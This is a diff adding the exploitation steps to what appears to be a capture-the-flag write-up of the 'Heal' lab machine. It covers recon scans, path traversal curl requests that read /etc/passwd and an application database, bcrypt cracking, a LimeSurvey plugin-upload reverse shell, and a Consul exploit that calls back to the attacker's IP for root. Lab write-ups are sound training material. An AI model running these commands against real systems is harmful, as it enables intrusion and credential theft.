@@ -27,7 +27,7 @@
         <p class="code">nmap -sC -sV -p 22,80 10.10.11.46 -o nmap_46_services</p>
         <img src="img/heal/nmap2.png">
         <p class="code">sudo nmap -sU --top-ports 500 10.10.11.46 -o nmap_46_udp</p>
-        <img src="img/heal/nmap3">
+        <img src="img/heal/nmap3.png">
         <p>TCP scan returned versions for OpenSSH and nginx web server. UDP scan returned ports 68 and 5353 open. Decided to focus on open TCP ports to start.</p>
         <p> There were no publicly available exploits for the OpenSSH or nginx software versions running</p>
         <p> I Turned my foucs towards the web application</p>
@@ -35,5 +35,118 @@
         <img src="img/heal/webpage1.png">
         <p>The initial web page is a login screen. Create an account to browse the application.</p>
         <img src="img/heal/webpage2.png">
-      </div>
+        <p>See that the website has a resume builder function with several user input fields. Added “resume” to list of known directories
+            <br>Run gobuster scans in the background while browsing the application</p>
+        <p class="code">gobuster dir -u http://heal.htb -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -r -k -o gobuster_46 -x txt,xml,php</p>
+        <p class="code">gobuster vhost -u heal.htb -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt --append-domain -o gobuster_46_vhost</p>
+        <p>While navigating the website, identified the sub domain "take-survey.heal.htb". Added to /etc/hosts</p>
+        <img src="img/heal/lime1.png">
+        <p>Noted that the Limesurvey software was running. Also noted ralph was a potential username and added to a users.txt file. Ran quick search to see if there were known exploits for the software.
+            Several exploits were returned including an authenticated RCE exploit. Made a note that exploits were available and I needed to find the version of Limesurvey and potentially credentials. Checked the page source code quickly to try and identify the version, but was unsuccessful.
+            At this point I returned to check the gobuster scan results
+            </p>
+        <img src="img/heal/gobuster1.png">
+        <p>Found the subdomain “api.heal.htb” and added to /etc/hosts. Nothing of note returned for the other gobuster command</p>
+        <p>Ran gobuster commands to identify endpoint on the two subdomains discovered</p>
+        <br>
+        <p class="code">gobuster dir -u http://api.heal.htb -w /usr/share/wordlists/seclists/Discovery/Web-Content/api/actions.txt -r -k -o gobuster_46_api</p>
+        <p class="code">gobuster dir -u http://take-survey.heal.htb -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -r -k -o gobuster_46_take-survey -x txt,xml,php</p>
+        <img src="img/heal/gobuster2.png">
+        <img src="img/heal/gobuster3.png">
+        <p>Additionally, reviewed burpsuite proxy traffic. Identified the API endpoints, "export", "signin", and "signup". Saved all endpoints to a file to keep track of them.</p>
+        <p>I navigated to take-survey.heal.htb/admin and tried to log in with the default credentials for the 
+          application as well as the usernames admin and ralph with common passwords. These attempts were unsuccessful.</p>
+        <p>Refocused efforts on the web API. Circled back to the download endpoint for the API. Tested 
+          for a path traversal vulnerability in the filename parameter</p>
+        <img src="img/heal/LFI.png">
+        <p> Success! Based on the results I added  ron, postgres and root to the users.txt file, since they were 
+          users with a shell assigned. Now it's time to exploit the LFI vulnerability to gain a foothold.</p>
+        <h2>Exploit</h2>
+        <p>Once the vulnerability was identified I switched to using the curl command so it would be easier to save the output</p>
+        <p>Captured the /etc/passwd file on the target system</p>
+        <p class="code">curl -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoyfQ.73dLFyR_K1A7yY9uDP6xu7H1p_c7DlFQEoN1g-LFFMQ' "api.heal.htb/download?filename=../../../../../etc/passwd" -o passwd.txt</p>
+        <p>Additionally, tried getting /etc/shadow and SSH keys for users but was unsuccessful</p>
+        <p>I attempted to pull the config file to expose the password or learn more about the instillation. Online research showed that the config file was located at limesurvey/application/config/config.php
+         Several attempts to download the config.php were made by editing the relative file path and levels of directory traversal, but were unsuccessful.</p>
+        <p>Reasoned I must be accessing the web directory for RubyonRails, so I did research on where that config file was located</p>
+        <p>Documentation showed the application should be accessing a database specified in the config/database.yml</p>
+        <p class="code">curl -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoyfQ.73dLFyR_K1A7yY9uDP6xu7H1p_c7DlFQEoN1g-LFFMQ' "api.heal.htb/download?filename=../../config/database.yml"</p>
+        <img src="img/heal/lfi_db_yaml.png">
+        <p>This confirmed the path to the database was storage/development.sqlite3</p>
+        <p class="code">curl -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoyfQ.73dLFyR_K1A7yY9uDP6xu7H1p_c7DlFQEoN1g-LFFMQ' "api.heal.htb/download?filename=../../ storage/development.sqlite3" -o development.sqlite3</p>
+        <p>Opened the database and found a password hash for ralph</p>
+        <img src="img/heal/sqlite.png">
+        <p>Saved the hash in the file hash.txt and checked type with hashid</p>
+        <p class="code">hashid hash.txt</p>
+        <img src="img/heal/hashid.png">
+        <p>Researched hash types used by Ruby on Rails and determined bcrypt was the most likely hash. Attempted to crack with hashcat.</p>
+        <p class="code">hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt –force</p>
+        <img src="img/heal/hashcat.png">
+        <p>Successfully logged in to the admin portal at take-survey.heal.htb/admin using the recovered credentials</p>
+        <p>Noted the actual version of Limesurvey running was 6.6.4 Community edition</p>
+        <p>Researched exploits against Limesurvey version 6.6.4 and discovered it is vulnerable to CVE2021-44967</p>
+        <p>Made the necessary changes to the exploit to make it run. Copied php reverse shell from /usr/share/webshells/php/php-reverse-shell.php into working directory and edited to change IP and port for shel </p>
+        <img src="img/heal/webshell_edit.png">
+        <p>Edited config.xml to change title to Charles for ease of use</p>
+        <img src="img/heal/exploit_update1.png">
+        <p>Zipped the payload together</p>
+        <p class="code">zip -r plugin.zip config.xml php-reverse-shell.php</p>
+        <p>Navigated to the plugin section in the lime survey admin portal to find anticipated plugin id</p>
+        <img src="img/heal/plugin_number.png">
+        <p>Page showed 18 plugins installed. Edited exploit with payload file location, anticipated plugin id, and uploaded reverse shell file path.</p>
+        <img src="img/heal/exploit_update2.png">
+        <p>Started a listener on port 443 and ran the exploit</p>
+        <p class="code">nc -vlnp 443</p>
+        <p class="code">python 50573.py http://take-survey.heal.htb ralph 14********* 80</p>
+        <img src="img/heal/exploit.png">
+        <p>Now to check the listener.</p>
+        <img src="img/heal/callback.png">
+        <p>Got a connection from the www-data user</p>
+        <h2>Privilege Escalation</h2>
+        <p>First step was to upgrade to a fully interactive shell.</p>
+        <p class="code">python3 -c 'import pty; pty.spawn("/bin/bash")'</p>
+        <p>Began info gathering on the environment</p>
+        <p class="code">whoami</p>
+        <p class="code">id</p>
+        <p class="code">uname -a</p>
+        <img src="img/heal/whoami.png">
+        <p class="code">history</p>
+         <img src="img/heal/history.png">
+        <p class="code">env</p>
+         <img src="img/heal/env.png">
+        <p class="code">ifconfig</p>
+         <img src="img/heal/ifconfig.png">
+        <p class="code">netstat -l</p>
+         <img src="img/heal/netstat.png">
+        <p>I noted that there was a sql server and many other ports listening locally</p>
+        <p>Accessed config.php for limesurvey file I attempted to read earlier. </p>
+        <img src="img/heal/postgress_pw.png">
+        <p>Try to resuse known passwords to change users. The combo of ron with the postgress db password works</p>
+        <img src="img/heal/su_ron.png">
+        <p>For a more stable connection ssh using ron's credentials</p>
+        <p>Checked for more avenues of privilege escalation</p>
+        <p class="code">ps aux|grep root</p>
+        <img src="img/heal/ps_aux.png">
+        <p>Noticed the binary /usr/local/bin/consul running as root and listening on local ports.</p>
+        <p>Used the binary to get the version</p>
+        <p class="code">./consul version</p>
+        <img src="img/heal/consul_version.png">
+        <p class="code">searchsploit consul</p>
+        <img src="img/heal/consul_searchsploit.png">
+        <p>Decided to use exploit 51117.py. Moved exploit onto target machine using simple python http server and calling curl from the target machine.</p>
+        <p>Started a listener on port 21</p>
+        <p class="code">nc -vlnp 21</p>
+        <p>Ran exploit on target machine</p>
+        <p class="code">python3 exploit.py 127.0.0.1 8500 10.10.14.7 21 1</p>
+        <img src="img/heal/privesc.png">
+        <p>Check the listener</p>
+        <img src="img/heal/root.png">
+        <p>We receive connection as root and have pwned the lab. Rejoice!</p>
+
+
+        
+
+
+
+    </div>
     </div>
